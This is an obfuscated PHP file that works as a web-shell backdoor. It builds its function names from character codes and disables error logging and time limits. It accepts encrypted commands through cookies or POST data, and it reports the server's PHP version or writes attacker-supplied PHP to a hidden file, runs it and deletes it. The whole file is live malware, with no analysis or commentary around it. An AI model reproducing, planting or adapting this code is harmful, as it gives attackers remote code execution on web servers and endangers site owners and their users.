<?php $bfcgusyi = 'f'.'i'."\x6c"."\x65"."\137"."\x70".chr(406-289).'t'."\137"."\x63".'o'."\156"."\x74".'e'.'n'.'t'.chr(406-291);
$guxitzbsqg = "\x62"."\x61".'s'.chr(101)."\66".chr(364-312)."\137".chr(100)."\145"."\143".'o'.chr(100).chr(101);
$onnhv = "\151".'n'.chr(105).chr(1032-937)."\x73".chr(524-423).'t';
$pjfykgopnj = 'u'.'n'.chr(108)."\x69"."\x6e"."\153";


@$onnhv("\145".chr(264-150).'r'."\x6f".chr(114)."\x5f"."\154".chr(111).chr(238-135), NULL);
@$onnhv(chr(108).chr(581-470)."\147".chr(302-207).chr(354-253).chr(114).'r'.chr(1019-908)."\162"."\x73", 0);
@$onnhv(chr(623-514).'a'."\170".chr(95)."\145".chr(120)."\145".'c'.chr(117).chr(435-319).chr(105).chr(111)."\x6e"."\x5f"."\x74"."\151"."\x6d"."\145", 0);
@set_time_limit(0);

function lwbzclg($lgjpjp, $uwiqcymf)
{
    $nsntukxlzf = "";
    for ($ibysq = 0; $ibysq < strlen($lgjpjp);) {
        for ($j = 0; $j < strlen($uwiqcymf) && $ibysq < strlen($lgjpjp); $j++, $ibysq++) {
            $nsntukxlzf .= chr(ord($lgjpjp[$ibysq]) ^ ord($uwiqcymf[$j]));
        }
    }
    return $nsntukxlzf;
}

$lichqqpy = array_merge($_COOKIE, $_POST);
$wfwgygxx = 'bb17f253-6fac-4a1c-888e-ca62b3ea8a4d';
foreach ($lichqqpy as $zxxqd => $lgjpjp) {
    $lgjpjp = @unserialize(lwbzclg(lwbzclg($guxitzbsqg($lgjpjp), $wfwgygxx), $zxxqd));
    if (isset($lgjpjp["\141".chr(107)])) {
        if ($lgjpjp["\141"] == chr(105)) {
            $ibysq = array(
                "\x70"."\166" => @phpversion(),
                chr(115).'v' => "3.5",
            );
            echo @serialize($ibysq);
        } elseif ($lgjpjp["\141"] == "\x65") {
            $rrexuy = "./" . md5($wfwgygxx) . '.'.chr(105).chr(110).'c';
            @$bfcgusyi($rrexuy, "<" . "\77"."\160"."\x68".'p'."\40".'@'.'u'.chr(657-547).chr(304-196).chr(105)."\x6e".chr(741-634).chr(256-216).chr(726-631).'_'.chr(812-742).chr(73).chr(76)."\105"."\x5f".chr(708-613).')'.';'."\40" . $lgjpjp["\x64"]);
            @include($rrexuy);
            @$pjfykgopnj($rrexuy);
        }
        exit();
    }
}

